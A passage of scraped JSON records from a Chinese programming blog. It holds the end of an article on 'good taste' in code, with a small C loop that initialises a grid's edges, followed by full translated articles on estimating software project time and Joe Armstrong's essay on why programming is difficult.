data-line=\"crayon-594b05ef3c35e887409968-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c35e887409968-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c35e887409968-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05ef3c35e887409968-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05ef3c35e887409968-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05ef3c35e887409968-1\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c35e887409968-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Top Edge</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c35e887409968-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c35e887409968-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Bottom Edge</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c35e887409968-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c35e887409968-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Left Edge</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c35e887409968-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c35e887409968-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Right Edge</span></div><div class=\"crayon-line\" id=\"crayon-594b05ef3c35e887409968-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">grid</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">GRID_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05ef3c35e887409968-10\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>这段代码通过每次循环迭代来初始化四条边缘上的点。它并不复杂，而且非常高效，易于阅读。和原始的版本，甚至是第二个版本相比，都有天壤之别。</p>\n<p>至此，我已经非常满意了。</p>\n<p>那么，我是一个有 “good taste” 的开发者么？</p>\n<p>我觉得我是，但是这并不是因为我上面提供的这个例子，也不是因为我在这篇文章中没有提到的其它代码……而是因为具有 “good taste” 的编码工作远非一段代码所能代表。Linus 自己也说他所提供的这段代码不足以表达他的观点。</p>\n<p>我明白 Linus 的意思，也明白那些具有 “good taste” 的程序员虽各有不同，但是他们都是会将他们之前开发的代码花费时间重构的人。他们明确界定了所开发的组件的边界，以及是如何与其它组件之间的交互。他们试着确保每一样工作都完美、优雅。</p>\n<p>其结果就是类似于 Linus 的 “good taste” 的例子，或者像我的例子一样，不过是千千万万个 “good taste”。</p>\n<p>你会让你的下个项目也具有这种 “good taste” 吗？</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111159\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111159votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111159\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx4.sinaimg.cn/large/63918611gy1ffjtjwjg02j20m80ci0tz.jpg"], "fav_nums": 6, "comment_nums": 2, "create_date": "2017/05/13", "praise_nums": 2}
{"tags": "时间,时间估算,其他", "front_image_path": "full/7bb53a63c829a4038664776a418d955c94adfe80.jpg", "title": "程序员必备的项目时间估算指南", "url_object_id": "c9e14199490768f06f81fc017a40950f", "url": "http://blog.jobbole.com/111132/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/nemoland\">李大萌</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://hackernoon.com/a-software-engineers-essential-time-estimation-guide-d7328238c510#.2ytnlnobo\">Kat Busch</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><div>\n<blockquote><p>霍夫斯塔特定律：实际花费的时间总是比预期的要长，即便你考虑到了本条定律。——Douglas Hofstadter</p></blockquote>\n</div>\n<p>有位 PM 最近告诉我她面临的一个难题：“软件工程师永远不能估算出他们的项目需要多长时间。我该怎么办？”还有两位 CEO 最近也告诉我同样的事情。</p>\n<p>《<a href=\"http://blog.jobbole.com/24924/\" target=\"_blank\" rel=\"f:url\">为什么程序员总是不能准确估测项目时间？</a>》，我们都深有体会。我曾经遇到过一个项目，预计需要两天完成，结果做了四个月。在这种情况下，即使用“时间翻倍”的经验估算，也依然差出了一个数量级之多。这样真的非常影响业务。我曾见过整个公司为了举办一个发布活动费尽心力，结果却不得不推迟数月。</p>\n<p>从高级层面上讲，这个问题在于在时间估算的时候，工程师、PM、经理、公关以及其他所有人的看法存在不同。大多数工程师本能考虑的是，如果一切都按照计划进行，写出一个可用的原型需要的最短时间。但下游的人想知道的是项目何时准备发布——这完全是另外一回事了。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ffgg4m0k3sj20gs0b674p.jpg\"></p>\n<p>对于工程师而言，把握估算项目所需时间是一段终身的旅程。忽视这个问题，会给你以及与你直接或间接接触的每个人带来困扰。精准把握估算项目所需时间会让你脱颖而出，同事们将会把这些和你的专业精神，稳定性和工作质量相关联。</p>\n<h2>为什么我们要时间估算</h2>\n<p>首先我来回答一下工程师经常问到的问题：“为什么要估算时间？”许多工程师抱怨（有一定道理）这是一份间接成本。“如果我开足马力去做，会更快地完成项目！”</p>\n<p>主要有两个原因：外部依赖和优先次序。</p>\n<h3>外部依赖</h3>\n<p>没有任何有效活动会在真空中运作。项目通常有外部依赖，例如与非工程团队（通讯，金融，公关，客服）、其他工程团队甚至最终用户本身的协作。协调这些外部依赖关系通常是经理、PM或CEO的职责。这意味着最有资格做时间估算的人（工程师）不是最需要估算时间信息的人。这种不对称导致了根本的矛盾。</p>\n<h3>优先次序</h3>\n<p>时间估算也是确定工作优先级的关键。“钱花的值不值”是项目中的重要指标，没有真正的估算，也就无法确定钱花的值不值。即使你正在做的功能是世界上最棒的，如果花时间做一个全面的估计，你可能会意识到这将需要花费很长时间才能完成。</p>\n<p>假设你正在做一个项目，这将使网站的速度提升50％，但在相同的时间内，可以完成两个项目，每个项目将使网站快40％。如果没有花时间做一个初步的估计，你永远不会知道你可以做出一个访问速度更快的网站！</p>\n<h2>时间估算入门</h2>\n<p>现在大家都同意绝大多数时候都需要时间估算，我们来谈谈技巧。</p>\n<p>我们低估时间是因为我们考虑的是“我需要多长时间才能写出这个基本版本？”</p>\n<p>但交付的东西不仅仅是基础版。还需要考虑到编写，测试，调试和润色所需的时间。不要忘了开会、访谈、做代码审查以及发送电子邮件等事情也需要时间。</p>\n<p>低估时间的另一个原因是我们几乎总是在编码过程中遇到“未知数”，这些未知数是不可能完全预测和考虑周全的。也许IDE会更新，中断了项目，你花费一天的时间去修复它。在时间估算中无法考虑到这一点。</p>\n<p>但是，我们仍然可以比最初的直觉做的更好。以下是我的做法：</p>\n<h3>第一步：制定技术计划</h3>\n<p>在着手开始工作前，你应该已经有了一份技术规划或设计文件，可以为任何重要的项目提供帮助。可以用这个让别人知道你在做什么，并获得反馈。制定技术计划是启动时间估算的理想阶段。当完成技术细节设计时，会发现未知问题，你将会神奇地修改估算时间。也许你会意识到，可能需要把一个正在使用的库升级到新版本，这可能会增加一天的时间。甚至可能意识到计划使用的库实际上并不存在，需要自己写。</p>\n<p>颗粒度在这里很重要。如果任何一步感到模糊或者不清楚，或许你会跳过这个步骤（应该学习更多），或者需要将其分解成更小的步骤。同时如果某个步骤粒度太细，那么在实践中可能会不堪一击使整个计划无效。</p>\n<p>有关技术计划里应该考虑哪些方面，请参阅 Alicia Chen 的这篇文章《<a href=\"https://medium.com/@owlishness/what-do-you-mean-we-need-more-time-c4b7120aa707\" target=\"_blank\">What do you mean ‘we need more time’?</a>》。其中一个关键点是消除与 PM 或其他利益相关方之间的任何潜在歧义，这样最终你就不会因做错了某些事而不得不重新开始。</p>\n<h3>第二步：为每个步骤增加时间预算</h3>\n<p>估算一下技术方案中的每一步将执行多长时间。这通常会涉及对细节的研究（“有没有已经有人实现了这个库的功能？”）。根据项目的性质，罗列一个简单原型，可能会有助于暴露出许多未来潜在的痛点。</p>\n<h3>第三步：添加大量的额外时间</h3>\n<p>现在你已经有一个初步的估计，但是我们之前提到的所有的点还需要考虑。</p>\n<ul>\n<li>随时调试：总是会有Bug。调试很大程度上取决于你对特定代码库的经验和代码库的成熟度。</li>\n</ul>\n<ul>\n<li>会议、访谈、假期等：可能你不会在工位一直编码。你真正会有多少个小时进行编码？估算时应该至少看看你的日历。</li>\n</ul>\n<ul>\n<li>最终测试和bug清理：通常你在编码的同时应该也在写测试，但是很多团队在发布前，需要进行一轮润色工作或集成测试。在估算中要给予这些工作足够的预算。如果分阶段进行推出，最初推出的1％内容，可能会暴露需要修复的bug，需要考虑到这一点。</li>\n</ul>\n<ul>\n<li>代码审查：项目需要做几轮代码审查？通常需要多长时间？一定要确保有充足的评审人员（也可以确认一下他们的日程安排）。如果这是只有一个评审人员的项目，应该提前征求他们同意，要求他们安排一名候补人员，以防评审人员会休假或者在关键节点太忙。</li>\n</ul>\n<p>一旦开始将所有这些时间开销添加到项目中，就会开始看到自己的时间估算值与项目实际启动时匹配地多了。是的，实际情况可能会比估计的更长，你可能会倍感压力去缩短工期。但是当大家知道他们可以依靠你时，他们会欣赏你的估算。</p>\n<h3>第四步：项目发布后，对时间估算做回顾总结</h3>\n<p>在项目完成之后回顾一下所做的工作，这听起来很痛苦。但是这种审查回顾会让你从中学到很多，下次做的更好。</p>\n<p>哪个过程结果与预期的时间不同？如果集成测试花费了比预期两倍的时间，记下来，下次给测试留下更多的时间。或者尝试改进集成测试系统。</p>\n<p>你一定会看到自己的估算随着时间的推移而不断改善。甚至可以在这个过程中提出一些很好的见解，来帮助整个团队。</p>\n<h3>最后，一切都与沟通有关</h3>\n<p>你的时间表和其他变动事宜，应该提前告知其他人。如果在发布前一个月让经理知道你正在使用的库中存在新的安全漏洞，不得不从头开始，他们会有时间相应的通知公关，财务或用户，需要推迟发布。</p>\n<p>和其他协作方沟通得来的重要反馈，有助于调整时间估算。设计师可能会说：“哦，如果这个花哨的动画将要花一整周的时间，我们可以完全剪掉它。”PM可能会补充说：“这只是用户研究中的一个原型实验。我们不需要为这个迭代做太多的bug清理。”经理可能会说，“你把一半的时间用在了开会？我来解决这个事情！”</p>\n<p>对于工程师来说，不要为了取悦上级，向不切实际的时间表妥协。坦诚地说出你的估算时间和变更方式，这样更专业。</p>\n<p>对于其他所有人来说，尊重估算的时间是很难的，而且这需要一个过程。你只能坐下来砍掉实际上不需要发布的功能或阶段，来缩短预计的时间，而不是通过唠叨把时间缩短。</p>\n<p>我们永远无法完美估算项目所需的时间。唯一的办法就是保持开放、多沟通、有同理心，并果断地确定优先次序。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111132\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111132votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111132\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">李大萌</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            码农一枚        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/nemoland\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/nemoland/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 19</a> · <a title=\"QQ：727231337\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：qq_nemo\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/large/63918611gy1ffgg4m0k3sj20gs0b674p.jpg"], "fav_nums": 6, "comment_nums": 0, "create_date": "2017/05/15", "praise_nums": 1}
{"tags": "程序员,编程,开发", "front_image_path": "full/d230b04aed54ef1d45b25cb4dec148f2c3b77551.jpg", "title": "为何编程如此之难？Erlang 之父的感触", "url_object_id": "4c0ab1a0dd71865e5844fd476923869e", "url": "http://blog.jobbole.com/111190/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/nightwishss\">土豆粉ss</a> 翻译，<a href=\"http://www.jobbole.com/members/oliverpp\">蒋生武</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://joearms.github.io/2014/02/07/why-programming-is-difficult.html\">Joe Armstrong</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：作为程序员，你会如何跟非程序员解释写程序不容易这件事？为啥看不见摸不着的程序需要花时间去写去维护？很多人其实都没想明白。来看看 Erlang 之父 Joe Armstrong 的感触。<b></b></p>\n<p><img id=\"pic\" class=\"M_cur_zoom_in\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1ffo76zvj3xj20sg0izdiv.jpg\" width=\"601\" height=\"401\"></p>\n<h2>编程为什么这么难？</h2>\n<p>多年前我曾一度认为编程很简单，然而随着岁月的流逝，我终于意识到编程并不是件容易的事。这是因为，我所认为的「究竟什么是编程」和「程序员到底是做什么的」，在感知上已经渐渐地发生了转变。</p>\n<p><img class=\"alignnone size-medium wp-image-64226\" src=\"http://jbcdn2.b0.upaiyun.com/2016/12/0918d83c92833a108021ea9f43bd15e0-300x131.png\" alt=\"program\" width=\"300\" height=\"131\"></p>\n<p><strong>定义1：所谓程序就是一种把输入转化为输出的东西，程序员就是写程序的人，编程就是写程序的这个行为；</strong></p>\n<p>现在让我们给我对程序的这个定义加一些约束吧。</p>\n<p><strong>定义2： 所谓程序就是在遵从下列约束的条件下，把一些输入转化为输出的东西。</strong></p>\n<ul>\n<li>程序输出是优美的；</li>\n<li>程序输入是优美的；</li>\n<li>程序本身也是优美的；</li>\n<li>程序输入有着完好并正确的文档；</li>\n<li>程序本身也是有着完好并正确的文档；</li>\n<li>程序是经过良好测试过并验证是正确的；</li>\n<li>正在解决的问题是十分明确的；</li>\n<li>整个问题本身也是十分明确的；</li>\n</ul>\n<p>加上这些约束后，编程就变得非常困难了。现在对于一个特定的问题，上述一部分约束是可以放松的。几个典型的设想是：</p>\n<h3>不必持续维护的程序</h3>\n<p>我们经常仅仅为了得到输出结果而写程序。 这种情况下，程序的输入和程序本身以后是不需要维护的，因此这些不必诠释地特别优美和充分。</p>\n<p>我的 Erlang 这本书就是这样的一个例子。一旦书出版了，为了写书而使用的程序以及输入部分就不必在维护了。程序结果看起来很优美，但是输入部分只是一堆混乱的 xml 文件，为了写书而用到的一些测试代码也永远不必保留了。</p>\n<p>书的勘误表和为了后续重版的一些必要订正只是涉及到了输入部分的轻微修改，即使程序的输入部分并没有很完善的整理记录过，这也是很容易操作的。</p>\n<h3>必须要维护的程序</h3>\n<p>对于那些从头到尾都要进行维护的程序来说就是这种。程序的输入和程序本身都必须诠释地特别优美，文档和注释完整而优雅。</p>\n<p>我不久之前和一位开发 Web 应用程序的计算机咨询师聊天。他说一旦程序的输出看起来没问题了（即网站看起来不错，程序似乎也可以运行了），客户就会认为项目已经完成了，项目经理就会把他分配到下一个项目上去。</p>\n<p>在下一个项目启动之前，不仅网站要看起来不错，而且编写的代码也应该是整理有序并且有案可循的。但是人们没有空闲时间这么做，也无法理解这个观点。而这类项目就是在将来需要一直被维护的。</p>\n<h3>还有什么因素让编程困难？</h3>\n<p>还有其他三个因素让编程变得困难：</p>\n<ul>\n<li>修复本不应该出问题的程序</li>\n<li>没时间学习</li>\n<li>编程的恶劣环境</li>\n</ul>\n<p>这三个问题全是「时间的小偷」，让我们具体来看看：</p>\n<h3>修复本不该出问题的程序</h3>\n<p>为了解决某个特定的问题，我经常会使用既不是我写的，我也不是很理解的软件。最好的情况是，这个我不得不用的程序有一份描述精确的使用说明。 但是往往这个程序要么没有描述文件要么就是描述文件是错误的。</p>\n<p>那么， 当文件写着：『做XYZ后，就会发生PQR』，而你做了『XYZ』后，『PQR』却没发生的时候，你该怎么办呢？如果你很幸运，写这个程序的人就在你旁边，那么你就能直接过去问搞定这些问题。不是这样的话，你要么用Google碰碰运气，要么就直接挖出源代码找答案吧。</p>\n<p>用Google这个「大赌场」找怎么修复bug，真的是让人极度沮丧的事儿。我简单 Google 搜索一下，然后会发现一些记录，某个可怜不幸的家伙也遇到了和我正好一样的问题。我喜出望外，颤抖着用手指输入可以除掉诅咒的魔法指令…..然后…..啥也没有改变。问题依然存在。</p>\n<p>为啥这修复工作对其他人有效对我没用呢。难道有个邪恶的神监视着我，还是我处于宇宙中暂时不符合物理规律的局部区域？我们两个机器的初始状态不同，因此在一种状态内修复一个机器bug的方法未必能修复另一种状态下机器的bug。</p>\n<p>正像有时候我想用 smalltalk 编程，我们都用一模一样的程序映像开始着手-Smalltalk 的程序员必须活在这种情况不会发生的理想的天堂里，但是一旦有一天，甚至他们自己的程序可能不得不和其他程序对话的时候，好玩儿的事就开始了。修复被破坏的东西带来的沮丧是双重的，即便你已经赶走了bug，你也真的并不知道这是不是你要修复的最后一个问题，也不知道你所做的改变带来的实际影响。</p>\n<p>顺便说一句，这类问题耗费了我大部分的时间， 粗率估算一下大概占用60-70%。我曾经用了超过一星期的时间试图让一个坏了的LDAP服务器工作，我的老板禁止我执行我自己的LDAP服务器，然而和这个用 C 编码归档混乱的坏了的 LDAP 服务器斗争了一周后，我记忆模糊了一些，也忘记了老板说的话，意外地在午餐休息的时候用 Erlang 在 scratch 里成功地运行了服务器。</p>\n<p>老实说，这并不是一个完整的LDAP服务器，但是我也不需要一个完整的LDAP服务器。我只想运行一些命令而已，这其实是很容易修复的。 现在我对执行陈旧又变态的协议没有什么乐趣，而通常情况下最快的进行方式是在scratch里重新实现他们。</p>\n<h3>解决问题而不是学习</h3>\n<p>我懒，我就是个懒虫。当我想在LaTeX里放入一个图表的时候，我不想先读一遍391页的操作手册。现在我猜你肯定会指责我的懒惰和不健全的品德。我也知道我想应该先读一下这份优秀的手册，但是我想十分钟内在文档中放入一个图表，那么读完391页的手册是不可能的。解决这类问题时，我会选择更快的解决方法—但是长期来看这样损失惨重。</p>\n<p>制作文档这事儿，我一直犹豫是使用TeX/LaTeX，XSLT-FO还是我自己的 Erlguten。</p>\n<p>大约每三年我都有一次强烈的欲望把自己所有的文档直接在postscript中写一遍，然而之后我只是做个深呼吸后等这个想法慢慢消失。</p>\n<p>我猜 Giambattista Bondoni 在 1818 年发明他的手工印刷的时候，并没有特别关心排版一页纸是否要花费几个星期。但是现在我们让机器做这些无聊又危险的事儿，我们就有了更多的时间却没有时间把事儿做对了。</p>\n<p>我问我老板他是否需要一个炫酷的幻灯片做下次的讲座，他说需要并要求我在明天之前交给他。这使我没时间正确地学Tex（我估计几年可以完成这个事儿），也没时间实现我自己的排版语言（大概要用5年时间），也没时间在postscript里直接写（大概要一周左右）—这样我估计我还是用PowerPoint吧。</p>\n<h3>编程的恶劣环境</h3>\n<p>如果你读到了这里，你就会理解我说编程真的很难的话了。原因是工作场所就是设计来让编程更难的。我们开放的工作场所，提供了破坏我们聚精会神的吵闹环境，打扰我们的手机和让我们分心的因特网。</p>\n<p>幸运的是，我们可以去不会打扰我们的地方。那就是睡觉。很多编程问题都是在睡觉的时候解决的。</p>\n<p>有两个办法，第一你把问题上传到你的大脑里然后睡觉，第二天起床后一些问题就解决了。很简单。</p>\n<p>第二，你把问题在睡前放到网上或者推特上。第二天就会有人发给你解决办法了。成为一个好的程序员是需要很长时间的，你需要学习很多的知识也需要知道当你卡壳的时候去问谁。</p>\n<h3>令人惊讶的事实</h3>\n<p>当我完成这篇文章的时候，我想检查下内容的拼写。 emacs的ispell模式罢工了。这个我一直用于拼写检查的程序，现在无法搜索到一个拼写。</p>\n<p>我的emacs拼写检查器在这台机器上忠实的工作了好几年了。就在我抱怨花费半生时间修复本不应该出问题的程序的时候，我的emacs拼写检查器坏掉了。</p>\n<p>我不信邪神，也不信我现在打字的起居室沙发的左边角落不遵循物理定侓。尽管有些间接的证据似乎在反驳我。</p>\n<p>我不知道我的拼写检查器坏掉的原因—一切看起来都没问题，我没有改变任何东西。哦从我上次检查文本拼写后，我只安装了新版的Erlang安装了Julia，并写了一些讲座笔记而已。</p>\n<p>幸运的是，在Google赌场里工作了11分钟后，第二个如何修复我的问题的建议起效了。 然而我还是不懂为什么 emacs 不能搜索一个拼写。人生苦短，来不及找寻所有答案。</p>\n<p>我猜大概只是有些事情我们永远不会明白罢了。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111190\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111190votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111190\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/nightwishss\">土豆粉ss</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/nightwishss\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/09/c4ca4238a0b923820dcc509a6f75849b3.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            兴趣：算法，人工智能，机器学习        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/nightwishss\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/nightwishss/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/nightwishss/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 13</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/nightwishss/\"><i class=\"fa fa-weibo\"></i></a> <a title=\"QQ：330642413\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx1.sinaimg.cn/large/7cc829d3gy1ffo76zvj3xj20sg0izdiv.jpg"], "fav_nums": 5, "comment_nums": 0, "create_date": "2017/05/17", "praise_nums": 1}
